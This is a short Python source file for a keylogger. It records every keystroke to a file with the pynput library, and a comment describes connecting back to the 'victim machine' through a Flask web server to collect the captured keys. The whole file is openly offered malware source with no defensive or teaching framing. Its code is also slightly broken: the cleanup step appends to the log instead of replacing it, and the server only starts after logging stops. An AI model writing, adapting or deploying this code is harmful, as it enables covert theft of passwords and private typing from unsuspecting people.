from pynput.keyboard import Listener
import re
from flask import Flask, send_file


def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'

    if re.match(r'[a-zA-Z0-9!@#$%^&*()\-_=+\[\]{}|\\:;"\'<>,.?/~`]', key):
        with open("log.txt", 'a') as f:
            f.write(key)

def clean_log_file():
    with open("log.txt", 'r') as f:
        data = f.read()

    cleaned_data = re.sub(r'[^a-zA-Z0-9!@#$%^&*()\-_=+\[\]{}|\\:;"\'<>,.?/~` \n]', '', data)

    with open("log.txt", 'a') as f:
        f.write(cleaned_data)     

with Listener(on_press=log_keystroke) as k_listener:
    k_listener.join()

clean_log_file()


#Using Flask, you can connect back to the victim machine via your browser to receive the log.txt file containing the captured keystrokes.
app = Flask(__name__)

@app.route('/')
def serve_log():
    return send_file('log.txt')

if __name__ == '__main__':
    app.run(host='PUT_IP_HERE', port='PORT_HERE')
